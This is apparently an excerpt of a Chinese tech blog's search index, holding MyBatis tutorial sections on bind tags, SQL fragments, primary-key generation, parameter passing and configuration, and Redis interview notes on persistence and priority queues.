接口直接定义以下类型的返回值，包括：int、long、boolean、Integer、Long、Boolean，这可用于判断增删改操作是否执行成功。 Bind 绑定在项目开发中，经常会使用到 like 查询条件来实现模糊查询，例如： 12345public interface EmployeeMapper { public List&lt;Employee&gt; getByLastName(String lastName);} 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getByLastName" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where last_name like concat(\'%\', #{lastName}, \'%\') &lt;/select&gt;&lt;/mapper&gt; 由于 MySQL 的 concat() 字符串连接函数支持多个参数，而 Oracle 的 concat() 函数只支持两个参数，因此上述的 SQL 在 Oracle 数据库会执行失败。由于不同数据库之间的语法差异，如果更换数据库，有些 SQL 语句可能就需要重写。针对这种情况，可以使用 bind 标签来避免因更换数据库而修改 SQL，同时也能防止 SQL 注入。 提示 bind 标签可以使用 OGNL 表达式创建一个变量，并将其绑定到上下文中 bind 标签的 name 属性是绑定到上下文的变量名，value 是 OGNL 表达式 将上述的 SQL 改为 bind 方式后，代码如下。 1234567891011&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- 将 OGNL 表达式的值绑定到一个变量中，这样方便后面引用这个变量的值 --&gt; &lt;select id="getByLastName" resultType="com.clay.mybatis.bean.Employee"&gt; &lt;bind name="_lastName" value="\'%\' + lastName + \'%\'" /&gt; select id, last_name as lastName, gender, email from t_employee where last_name like #{_lastName} &lt;/select&gt;&lt;/mapper&gt; SQL 重用sql 标签可以用来定义可重用的 SQL 代码片段，以便在其它语句中使用。参数可以静态地（在加载的时候）确定下来，并且可以在不同的 include 标签中定义不同的参数值。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-5。 使用案例一1&lt;sql id="userColumns"&gt; id, username, password &lt;/sql&gt; 上面的 SQL 片段可以在其它语句中使用，例如： 12345&lt;select id="selectUsers" resultType="map"&gt; select &lt;include refid="userColumns"&gt;&lt;/include&gt; from some_table&lt;/select&gt; 使用案例二或者配合 if 标签一起使用，_databaseId 是 MyBatis 的内置参数： 12345678&lt;sql id="userColumns"&gt; &lt;if test="_databaseId == \'oracle\'"&gt; id, username, email &lt;/if&gt; &lt;if test="_databaseId == \'mysql\'"&gt; id, username, gender &lt;/if&gt;&lt;/sql&gt; 使用案例三或者稍微复杂一点的使用（带参数替换），例如： 1&lt;sql id="userColumns"&gt; ${alias}.id, ${alias}.username, ${alias}.password &lt;/sql&gt; 123456789101112&lt;select id="selectUsers" resultType="map"&gt; select &lt;include refid="userColumns"&gt; &lt;property name="alias" value="t1" /&gt; &lt;/include&gt; , &lt;include refid="userColumns"&gt; &lt;property name="alias" value="t2" /&gt; &lt;/include&gt; from some_table t1 cross join some_table t2&lt;/select&gt; 上面的写法，最终发出的 SQL 语句如下： 12345select t1.id, t1.username, t1.password, t2.id, t2.username, t2.passwordfrom some_table t1cross join some_table t2 使用案例四或者在 include 标签的 refid 属性或内部语句中使用属性值，例如： 12345678910111213141516&lt;sql id="sometable"&gt; ${prefix}Table&lt;/sql&gt;&lt;sql id="someinclude"&gt; from &lt;include refid="${include_target}"/&gt;&lt;/sql&gt;&lt;select id="select" resultType="map"&gt; select id, username, email &lt;include refid="someinclude"&gt; &lt;property name="prefix" value="User"/&gt; &lt;property name="include_target" value="sometable"/&gt; &lt;/include&gt;&lt;/select&gt; 上面的写法，最终发出的 SQL 语句如下： 1select id, username, email from UserTable; 主键生成如前所述，插入语句的配置规则更加丰富，在插入语句里面有一些额外的属性和子标签用来处理主键的生成，并且提供了多种生成方式。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-5。 自增主键生成首先，如果数据库支持自增主键的字段（比如 MySQL 和 SQL Server），那么可以设置 useGeneratedKeys="true"，然后再把 keyProperty 设置为目标属性就可以了。例如，如果上面的 Author 表已经在 id 列上使用了自增长，那么插入语句可以修改为： 1234&lt;insert id="insertAuthor" parameterType="domain.blog.Author" useGeneratedKeys="true" keyProperty="id"&gt; insert into Author (username, password, email, bio) values (#{username}, #{password}, #{email}, #{bio})&lt;/insert&gt; SQL 映射文件里配置了自增主键后，在 Java 代码里就可以直接通过 JavaBean 对象获取到数据库里自增后的主键值。 123Author author = new Author("Tom", "123456", "tom@gmail.com", "");mapper.insertAuthor(author);System.out.println("id = " + author.getId()); 如果数据库还支持多行插入，则也可以传入一个 Author 数组或集合，并返回自动生成的主键。 123456&lt;insert id="insertAuthor" useGeneratedKeys="true" keyProperty="id"&gt; insert into Author (username, password, email, bio) values &lt;foreach item="item" collection="list" separator=","&gt; (#{item.username}, #{item.password}, #{item.email}, #{item.bio}) &lt;/foreach&gt;&lt;/insert&gt; 非自增主键生成生成随机主键对于不支持自动生成主键的数据库（Oracle）和可能不支持自动生成主键的 JDBC 驱动，MyBatis 有另外一种方法来生成主键。这里有一个简单（也很傻）的示例，它可以生成一个随机 ID（不建议在生产环境中使用，这里只是为了展示 MyBatis 处理问题的灵活性和宽容度）： 12345678910&lt;insert id="insertAuthor"&gt; &lt;!-- 会自动将查出的主键值封装给JavaBean的指定属性（如 id） --&gt; &lt;selectKey keyProperty="id" resultType="int" order="BEFORE"&gt; select CAST(RANDOM()*1000000 as INTEGER) a from SYSIBM.SYSDUMMY1 &lt;/selectKey&gt; insert into Author (id, username, password, email,bio, favourite_section) values (#{id}, #{username}, #{password}, #{email}, #{bio}, #{favouriteSection, jdbcType=VARCHAR})&lt;/insert&gt; 在上面的示例中，首先会执行 selectKey 标签中的语句，并设置 Author 的 id 属性，然后才会调用插入语句。这样就实现了数据库自动生成主键类似的行为，同时保持了 Java 代码的简洁。selectKey 标签描述如下： 12345&lt;selectKey keyProperty="id" resultType="int" order="BEFORE" statementType="PREPARED"&gt; 生成 Oracle 主键Oracle 数据库不支持自增主键，但可以使用序列来模拟自增，即每次插入的数据的主键都是从序列中拿到的值。 第一种方式（Before） 12345678&lt;insert id="addEmp" databaseId="oracle" parameterType="com.clay.mybatis.bean.Employee"&gt; &lt;!-- 查询主键的SQL语句，会自动将查出的主键值封装给JavaBean的指定属性（如 id） --&gt; &lt;selectKey keyProperty="id" order="BEFORE" resultType="Integer"&gt; select EMPLOYEES_SEQ.nextval from dual &lt;/selectKey&gt; insert into employees (id, last_name, email) values(#{id}, #{lastName}, #{email})&lt;/insert&gt; 先执行 selectKey 标签中查询主键的 SQL 语句（从序列中拿到），然后将查出的主键值封装给 JavaBean 的指定属性（如 id），最后再执行插入数据的 SQL 语句。 第二种方式（After） 12345678&lt;insert id="addEmp" databaseId="oracle" parameterType="com.clay.mybatis.bean.Employee"&gt; &lt;!-- 查询主键的SQL语句，会自动将查出的主键值封装给JavaBean的指定属性（如 id） --&gt; &lt;selectKey keyProperty="id" order="AFTER" resultType="Integer"&gt; select EMPLOYEES_SEQ.currval from dual &lt;/selectKey&gt; insert into employees (id, last_name, email) values(employees_seq.nextval, #{lastName}, #{email})&lt;/insert&gt; 先执行插入数据的 SQL 语句，再执行 selectKey 标签中查询主键的 SQL 语句（从序列中拿到），最后将查出的主键值封装给 JavaBean 的指定属性（如 id）。 特别注意 如果是批量插入多条数据，采用第二种方式（After）的写法，会导致在 Java 代码里只能拿到最后一条插入记录的主键值，因此推荐使用第一种方式（Before）。 参数处理本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-6。 单个参数 MyBatis 可以接受基本类型、对象类型、集合类型、数组类型的参数值，MyBatis 可直接使用这些类型的参数，不需要经过任何处理 针对基本类型，可以使用 #{参数名 / 任意名} 取出传入的参数值 针对对象类型、集合类型、数组类型的处理，详细说明请看后文的介绍 12345public interface EmployeeMapper { public Employee getEmpById(Long id);} 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpById" parameterType="Long" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 多个参数默认的处理方式 MyBatis 会做特殊处理 多个参数会被封装成一个 Map，其中 key 默认是 param1 ... paramN，或者是使用带索引的 arg0 ... argN，而 value 则是 Java 方法依次传入的参数值 举个例子，#{param1} 可以从 Map 中获取第一个 key 的值（Java 方法传入的第一个参数） 12345public interface EmployeeMapper { public Employee getEmpByIdAndEmail(Long id, String email);} 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpByIdAndEmail" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{param1} and email = #{param2} &lt;/select&gt;&lt;/mapper&gt; 使用注解的处理方式通过 @Param 注解，明确指定 MyBatis 封装参数时 Map 的 key，然后通过 #{key} 取出传入的参数值，此方式也被称为 命名参数，例如： 12345public interface EmployeeMapper { public Employee getEmpByIdAndEmailByAnnotation(@Param("id") Long id, @Param("email") String email);} 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpByIdAndEmailByAnnotation" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} and email = #{email} &lt;/select&gt;&lt;/mapper&gt; 提示 当传入多个参数时，建议使用 @Param 注解，这样会使 SQL 映射文件的可读性更强。 使用 POJO 传递参数如果有多个参数正好是业务逻辑的数据模型，那么还可以直接传入 POJO 对象，然后通过 #{属性名} 取出传入的 POJO 的属性值，例如： 12345public interface EmployeeMapper { public boolean addEmp(Employee employee);} 12345678&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;insert id="addEmp" parameterType="com.clay.mybatis.bean.Employee" useGeneratedKeys="true" keyProperty="id"&gt; insert into t_employee (last_name, gender, email) values(#{lastName}, #{gender}, #{email}) &lt;/insert&gt;&lt;/mapper&gt; 使用 Map 传递参数如果有多个参数且都不是业务模型中的数据，即没有 POJO 对象，为了开发方便，还可以直接传入 Map 对象，然后通过 #{key} 取出传入的参数值，例如： 12345public interface EmployeeMapper { public Employee getEmpByIdAndEmailByMap(Map&lt;String, Object&gt; params);} 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpByIdAndEmailByMap" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} and email = #{email} &lt;/select&gt;&lt;/mapper&gt; 提示 如果有多个参数且都不是业务模型中的数据，但是会经常使用，此时不建议使用 Map 来封装参数，而是推荐编写 DTO（Data Transfer Object）数据传输对象来封装多个参数。 使用 List 传递参数 如果传入的参数是 Collection（List、Set） 集合类型或者是数组类型，MyBatis 会做特殊处理，也就是会把传入的集合对象或者数组封装在 Map 中。 如果传入的参数是 Collection（List、Set） 类型，则可以统一使用 arg0 ... argN 作为 key 取出参数值。 如果传入的是单参数且参数是 List 类型，则还可以使用 collection 或者 list 作为 key 取出参数值。 如果传入的是单参数且参数是数组类型，则可以使用 array 作为 key 取出参数值。 12Java 参数：public Employee getEmpById(List&lt;Integer&gt; ids);SQL 取值：#{arg0[0]/collection[0]/list[0]} ==&gt; 取出第一个ID的值 12Java 参数：public Employee getEmpById(Long[] ids);SQL 取值：#{array[0]} ==&gt; 取出第一个ID的值 其他参数传递方式12Java Java 参数：public Employee getEmp(@Param("id")Integer id, String lastName);SQL 取值：id ==&gt; #{id/param1}, lastName ==&gt; #{param2} 12Java 参数：public Employee getEmp(Integer id, @Param("emp")Employee emp);SQL 取值：id ==&gt; #{param1}, lastName ==&gt; #{param2.lastName/emp.lastName} 内置参数MyBatis 提供了两个内置参数，分别是 _parameter 和 _databaseId，两者的使用说明如下： _parameter：代表所有参数 单个参数：_parameter 则代表这个参数 多个参数：多个参数会被 MyBatis 封装为一个 Map，而 _parameter 则代表这个 Map _databaseId：如果在 MyBatis 的全局配置文件中配置了 databaseIdProvider 标签（数据库厂商标识），那么 _databaseId 就代表当前数据库的别名 123456789&lt;configuration&gt; &lt;!-- 数据库厂商标识 --&gt; &lt;databaseIdProvider type="DB_VENDOR"&gt; &lt;property name="SQL Server" value="sqlserver" /&gt; &lt;property name="DB2" value="db2" /&gt; &lt;property name="MySQL" value="mysql" /&gt; &lt;property name="Oracle" value="oracle" /&gt; &lt;/databaseIdProvider&gt;&lt;/configuration&gt; 12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpByInnerParameter(Employee employee);} 1234567891011121314151617&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpByInnerParameter" resultType="com.clay.mybatis.bean.Employee"&gt; &lt;!-- 使用内置参数判断数据库类型 --&gt; &lt;if test="_databaseId == \'mysql\'"&gt; select * from t_employee &lt;!-- 使用内置参数判断传递进来的参数是否为NULL --&gt; &lt;if test="_parameter != null"&gt; where email = #{_parameter.email} &lt;/if&gt; &lt;/if&gt; &lt;if test="_databaseId == \'oracle\'"&gt; select * from employees &lt;/if&gt; &lt;/select&gt;&lt;/mapper&gt; $ 与 # 符取值区别两者的相同点： #{}：可以获取 Map 中的值或者 POJO 对象属性的值 ${}：可以获取 Map 中的值或者 POJO 对象属性的值 两者的不同点： #{}：是以预编译（PreparedStatement）的形式，将参数设置到 SQL 语句中，可以有效防止 SQL 注入，大多情况下都应该使用 #{} 取参数值 ${}：取出的值是直接拼接在 SQL 语句中，存在 SQL 注入的安全问题 在原生 JDBC 不支持使用 ? 占位符的地方，只能使用 ${} 进行取值，比如分表、排序 12345// 按照年份分表select * from ${year}_salary where xxx;// 排序select * from tbl_employee order by ${f_name} ${order} #{} 可以指定一个额外的属性，包括 javaType、jdbcType、mode、numericScale、resultMap、typeHandler、jdbcTypeName 12#{property, javaType=int, jdbcType=NUMERIC}#{height, javaType=double, jdbcType=NUMERIC, numericScale=2} 提示 MyBatis 对所有的 null 默认都映射为原生 Jdbc 的 OTHER 类型（无效的类型） jdbcType 通常需要在某种特定的条件下被设置，例如在数据为 null 的时候，有些数据库可能不能识别 MyBatis 对 null 的默认处理（将 null 映射为原生 Jdbc 的 OTHER 类型），比如 Oracle 不支持 解决 Oracle 对 null 值的兼容处理，可以使用 #{height, jdbcType=NULL} 指定 jdbcType 为 NULL，或者在 MyBatis 的全局配置文件中配置 &lt;setting name="jdbcTypeForNull" value="NULL"/&gt; 参数处理源码分析MyBatis 参数处理的核心代码在 ParamNameResolver 类里，最终结果是将传入的参数封装成 Map 对象，如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173/** * Copyright 2009-2020 the original author or authors. * * Licensed under the Apache License, Version 2.0 (the "License"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an "AS IS" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */package org.apache.ibatis.reflection;import java.lang.annotation.Annotation;import java.lang.reflect.Method;import java.util.Collection;import java.util.Collections;import java.util.List;import java.util.Map;import java.util.Optional;import java.util.SortedMap;import java.util.TreeMap;import org.apache.ibatis.annotations.Param;import org.apache.ibatis.binding.MapperMethod.ParamMap;import org.apache.ibatis.session.Configuration;import org.apache.ibatis.session.ResultHandler;import org.apache.ibatis.session.RowBounds;public class ParamNameResolver { public static final String GENERIC_NAME_PREFIX = "param"; private final boolean useActualParamName; /** * &lt;p&gt; * The key is the index and the value is the name of the parameter.&lt;br /&gt; * The name is obtained from {@link Param} if specified. When {@link Param} is not specified, * the parameter index is used. Note that this index could be different from the actual index * when the method has special parameters (i.e. {@link RowBounds} or {@link ResultHandler}). * &lt;/p&gt; * &lt;ul&gt; * &lt;li&gt;aMethod(@Param("M") int a, @Param("N") int b) -&amp;gt; {{0, "M"}, {1, "N"}}&lt;/li&gt; * &lt;li&gt;aMethod(int a, int b) -&amp;gt; {{0, "0"}, {1, "1"}}&lt;/li&gt; * &lt;li&gt;aMethod(int a, RowBounds rb, int b) -&amp;gt; {{0, "0"}, {2, "1"}}&lt;/li&gt; * &lt;/ul&gt; */ private final SortedMap&lt;Integer, String&gt; names; private boolean hasParamAnnotation; public ParamNameResolver(Configuration config, Method method) { this.useActualParamName = config.isUseActualParamName(); final Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); final Annotation[][] paramAnnotations = method.getParameterAnnotations(); final SortedMap&lt;Integer, String&gt; map = new TreeMap&lt;&gt;(); int paramCount = paramAnnotations.length; // get names from @Param annotations for (int paramIndex = 0; paramIndex &lt; paramCount; paramIndex++) { if (isSpecialParameter(paramTypes[paramIndex])) { // skip special parameters continue; } String name = null; for (Annotation annotation : paramAnnotations[paramIndex]) { if (annotation instanceof Param) { hasParamAnnotation = true; name = ((Param) annotation).value(); break; } } if (name == null) { // @Param was not specified. if (useActualParamName) { name = getActualParamName(method, paramIndex); } if (name == null) { // use the parameter index as the name ("0", "1", ...) // gcode issue #71 name = String.valueOf(map.size()); } } map.put(paramIndex, name); } names = Collections.unmodifiableSortedMap(map); } private String getActualParamName(Method method, int paramIndex) { return ParamNameUtil.getParamNames(method).get(paramIndex); } private static boolean isSpecialParameter(Class&lt;?&gt; clazz) { return RowBounds.class.isAssignableFrom(clazz) || ResultHandler.class.isAssignableFrom(clazz); } /** * Returns parameter names referenced by SQL providers. * * @return the names */ public String[] getNames() { return names.values().toArray(new String[0]); } /** * &lt;p&gt; * A single non-special parameter is returned without a name. * Multiple parameters are named using the naming rule. * In addition to the default names, this method also adds the generic names (param1, param2, * ...). * &lt;/p&gt; * * @param args * the args * @return the named params */ public Object getNamedParams(Object[] args) { final int paramCount = names.size(); if (args == null || paramCount == 0) { return null; } else if (!hasParamAnnotation &amp;&amp; paramCount == 1) { Object value = args[names.firstKey()]; return wrapToMapIfCollection(value, useActualParamName ? names.get(0) : null); } else { final Map&lt;String, Object&gt; param = new ParamMap&lt;&gt;(); int i = 0; for (Map.Entry&lt;Integer, String&gt; entry : names.entrySet()) { param.put(entry.getValue(), args[entry.getKey()]); // add generic param names (param1, param2, ...) final String genericParamName = GENERIC_NAME_PREFIX + (i + 1); // ensure not to overwrite parameter named with @Param if (!names.containsValue(genericParamName)) { param.put(genericParamName, args[entry.getKey()]); } i++; } return param; } } /** * Wrap to a {@link ParamMap} if object is {@link Collection} or array. * * @param object a parameter object * @param actualParamName an actual parameter name * (If specify a name, set an object to {@link ParamMap} with specified name) * @return a {@link ParamMap} * @since 3.5.5 */ public static Object wrapToMapIfCollection(Object object, String actualParamName) { if (object instanceof Collection) { ParamMap&lt;Object&gt; map = new ParamMap&lt;&gt;(); map.put("collection", object); if (object instanceof List) { map.put("list", object); } Optional.ofNullable(actualParamName).ifPresent(name -&gt; map.put(name, object)); return map; } else if (object != null &amp;&amp; object.getClass().isArray()) { ParamMap&lt;Object&gt; map = new ParamMap&lt;&gt;(); map.put("array", object); Optional.ofNullable(actualParamName).ifPresent(name -&gt; map.put(name, object)); return map; } return object; }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"缓存面试题之一",url:"/posts/6a0cde5a.html",text:'Redis持久化机制RDB 与 AOF RDB（Redis DataBase）持久化，是在指定的时间间隔内将内存中的数据集快照写入磁盘（point-in-time snapshot）。在 Redis 运行时，RDB 程序将当前内存中的数据集快照保存到磁盘文件中，在 Redis 重启动时，RDB 程序可以通过载入 RDB 文件来还原数据库的状态 AOF（Append Only File）持久化，以日志的形式来记录每个写操作，将 Redis 执行过的所有写指令记录下来，同时只许追加文件不能改写文件。当 Redis 重新启时，程序就可以通过重新执行 AOF 文件中的命令来达到重建数据集的目的 RDB 的优缺点 RDB 的优点 节省磁盘空间 数据恢复速度快 RDB 的缺点 在一定的时间间隔做一次备份，如果 Redis 以为 down 掉的话，那么最后一次持久化后的数据可能会丢失 虽然 Redis 在 fork 时使用了写时拷贝技术，但是如果数据量较大时，比较耗性能，可能会导致 Redis 在数毫秒或者几秒内不能响应客户端的请求 AOF 的优缺点 AOF 的优点 可读的日志文件 备份机制更稳健，丢失数据的概率更低 AOF 的缺点 数据恢复速度较慢 对于相同的数据集来说，与 RDB 比较，占用更多的磁盘空间 若同步策略为每次写入都同步的话，有一定的性能压力，尤其是处理巨大的写入时 五大数据类型的应用场景Redis 支持的键值数据类型包括：字符串类型、散列类型、列表类型、集合类型、有序集合类型。 数据类型 常用操作命令 应用场景 String get、SET、incr、decr、mget 常规的 key-value 缓存应用：IP 屏蔽；常规计数：微博数、粉丝数 Hash hget、hSET、hgetall 存储部分频繁变更的数据，如用户信息等 List LPUSH、rpush、lpop、rpop、lrange Twitter 的关注列表，微博粉丝列表，最新消息排行榜，作为栈、消息队列使用 SET sadd、spop、smembers、sunion 求差集、交集、并集，例如：微博的共同关注、共同喜好、二度好友等功能 Sorted SET zadd、zrange、zrem、zcard 商品的综合排名、价格排名、优先级队列 Redis 实现优先级队列通常使用 List 类型来实现队列操作，这样有一个小限制，所有的任务统一都是先进先出，如果想优先处理某个任务就不太好处理了，这就需要让队列有优先级的概念，支持优先处理高级别的任务，具体实现方式有以下几种。 单一列表实现队列正常的操作是 左进右出（LPUSH，rpop），为了先处理高优先级任务，在遇到高级别任务时，可以直接插队，即直接将任务放入队列头部（rpush），这样从队列头部（右侧）获取任务时，取到的就是高优先级的任务（rpop）。相当于普通任务按照队列结构，碰到高优先级任务，就按照栈结构（先进后出）。优点是实现简单，缺点是高级别任务总是后进先出，而且高优先级的任务之间的执行顺序是先进后出的，这样保证不了高优先级任务之间的执行顺序。适用于简单的队列需求，例如高优先级任务较少的情况。 多队列实现使用两个队列，一个普通队列，一个高级队列，针对任务的级别放入不同的队列。获取任务时也很简单，Redis 的 BRPOP 命令可以按顺序从多个队列中取值。BRPOP 命令会按照给出的 key 顺序查看，并在找到的第一个非空 List 的尾部弹出一个元素，而且 BRPOP 命令是阻塞式的。 1redis&gt; BRPOP list1 list2 0 其中 list1 做为高优先级任务队列，list2 做为普通任务队列，这样就实现了先处理高优先级任务，当没有高优先级任务时，就去获取普通任务。 使用权值实现如果优先级比较复杂，比如假设有个这样的场景，优先级不是简单的高中低或者 0-10 这些固定的级别，而是类似 0-99999 这么多级别，使用多队列的方式实现起来就不太方便了。 思路一、基于 List 类型 + 多队列 + 二分法： 虽然 Redis 有 Sorted SET 这样的可以排序的数据类型，很可惜它没有阻塞版的接口，因此只能使用 List 类型通过其他方式来完成目的。简单的做法可以只设置一个队列，并保证它是按照优先级排序的；然后通过二分查找法查找一个任务合适的位置，并通过 LSET 命令将任务插入到相应的位置。例如队列里面包含着写优先级的任务 [1, 3, 6, 8, 9, 14]，当有个优先级为 7 的任务过来，通过二分算法一个个从队列里面取数据出来和目标数据比对，计算出相应的位置然后插入到指定位置即可。因为二分查找是比较快的，并且 Redis 的数据也都在内存中，理论上速度是可以保证的。但是如果说数据量确实很大的话也可以通过额外方式来调优，比如与 “多队列实现方案” 结合起来就会很大程度上减少开销。假设数据量十万的队列，它们的优先级也是随机 0-10W 万的区间。可以设置 10 个或者 100 个不同的队列，0-1W 的优先级任务投放到 1 号队列，2W-3W 的任务投放到 2 号队列。这样将一个队列按不同等级拆分后，它单个队列的数据量就减少许多，这样二分法查找匹配的效率也会高一点。但是数据所占的资源基本是不变的，十万数据该占多少内存还是多少，只是系统里面多了一些队列而已。 思路二、基于 List 类型（存疑）： 假设有 3 个级别，用权值来表示为 1、2、3，此时有 4 个元素需要入队，分别是：a-1，b-2，c-3，d-3。 首先使用 LPUSH 把元素放入队列中，同时设置权值： 1234567891011redis&gt; LPUSH mylist aredis&gt; SET mylist_score_a 1redis&gt; LPUSH mylist bredis&gt; SET mylist_score_b 2redis&gt; LPUSH mylist credis&gt; SET mylist_score_c 3redis&gt; LPUSH mylist dredis&gt; SET mylist_score_d 3 根据权值排序，并取出排名第一的元素（c）： 1redis&gt; SORT mylist by mylist_score_* limit 0 1 元素获取完成后，要移除该元素（c）： 1redis&gt; LREM mylist 0 c 特别注意：由于 SORT 命令与 LREM 命令是前后执行的，并不是原子操作，所以此方案并不是线程安全的。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"MyBatis 入门教程之二",url:"/posts/62ce5629.html",text:'大纲 MyBatis 入门教程之一 MyBatis 入门教程之二 MyBatis 入门教程之三 MyBatis 入门教程之四 MyBatis 入门教程之五 MyBatis 入门教程之六 MyBatis 入门教程之七 MyBatis 入门教程之八 前言本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-3。 MyBatis 全局配置文件MyBatis 默认的全局配置文件是 mybatis-config.xml，且 XML 配置文件里的标签是有顺序的，由前到后依次是 properties, settings, typeAliases, typeHandlers, objectFactory, objectWrapperFactory, reflectorFactory, plugins, environments, databaseIdProvider, mappers。 属性（properties）在企业级开发中，往往会将数据库的连接信息写到单独的配置文件中，这样日后方便统一管理。MyBatis 为此提供了 properties 标签，用于读取外部的的 Properties 配置文件，读取到的属性值可以在整个 MyBatis 配置文件中用来替换需要动态配置的属性值。 config.properties 123dataSource.user=rootdataSource.password=123456dataSource.jdbcUrl=jdbc:mysql://127.0.0.1:3306/mybatis_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC mybatis-config.xml 123456789101112131415161718192021&lt;configuration&gt; &lt;!-- 读取外部的文件 --&gt; &lt;properties resource="config.properties" &gt; &lt;!-- 还可以在 properties 标签的子标签中设置--&gt; &lt;property name="dataSource.driverClass" value="com.mysql.cj.jdbc.Driver"/&gt; &lt;/properties&gt; &lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;!-- 配置事务 --&gt; &lt;transactionManager type="JDBC" /&gt; &lt;!-- 配置数据源 --&gt; &lt;dataSource type="POOLED"&gt; &lt;property name="url" value="${dataSource.jdbcUrl}" /&gt; &lt;property name="username" value="${dataSource.user}" /&gt; &lt;property name="password" value="${dataSource.password}" /&gt; &lt;property name="driver" value="${dataSource.driverClass}" /&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt;&lt;/configuration&gt; 提示 上述例子中的 driver 将会由 properties 标签的子标签中设置的相应值来替换。，而 url、username 和 password 属性将会由 config.properties 配置文件中对应的值来替换，这样就为配置提供了诸多灵活选择。 值得一提的是，开发人员还可以在 SqlSessionFactoryBuilder.build() 方法中传入属性值，示例代码如下： 123SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, props);// ... 或者 ...SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, environment, props); 如果一个属性在不只一个地方进行了配置，那么 MyBatis 将按照下面的顺序来加载： 首先读取在 properties 标签中指定的属性。 然后根据 properties 标签中的 resource 属性读取类路径下配置文件，或者根据 url 属性指定的路径读取配置文件，并覆盖之前读取过的同名属性。 最后读取作为方法参数传递的属性，并覆盖之前读取过的同名属性。 因此，通过方法参数传递的属性具有最高优先级，resource/url 属性中指定的配置文件次之，最低优先级的则是 properties 标签中指定的属性。 设置（settings）这是 MyBatis 中极为重要的调整设置，它们会改变 MyBatis 的运行时行为，完整的配置属性请看这里。配置示例如下： 12345678910111213141516171819&lt;configuration&gt; &lt;settings&gt; &lt;setting name="cacheEnabled" value="true"/&gt; &lt;setting name="lazyLoadingEnabled" value="true"/&gt; &lt;setting name="multipleResultSetsEnabled" value="true"/&gt; &lt;setting name="useColumnLabel" value="true"/&gt; &lt;setting name="useGeneratedKeys" value="false"/&gt; &lt;setting name="autoMappingBehavior" value="PARTIAL"/&gt; &lt;setting name="autoMappingUnknownColumnBehavior" value="WARNING"/&gt; &lt;setting name="defaultExecutorType" value="SIMPLE"/&gt; &lt;setting name="defaultStatementTimeout" value="25"/&gt; &lt;setting name="defaultFetchSize" value="100"/&gt; &lt;setting name="safeRowBoundsEnabled" value="false"/&gt; &lt;setting name="mapUnderscoreToCamelCase" value="false"/&gt; &lt;setting name="localCacheScope" value="SESSION"/&gt; &lt;setting name="jdbcTypeForNull" value="OTHER"/&gt; &lt;setting name="lazyLoadTriggerMethods" value="equals,clone,hashCode,toString"/&gt; &lt;/settings&gt;&lt;/configuration&gt; 类型别名（typeAliases）类型别名可以为 Java 类型设置一个缩写名字。它仅用于 XML 配置中，意在降低冗余的全限定类名书写，方便引用某个类。例如： 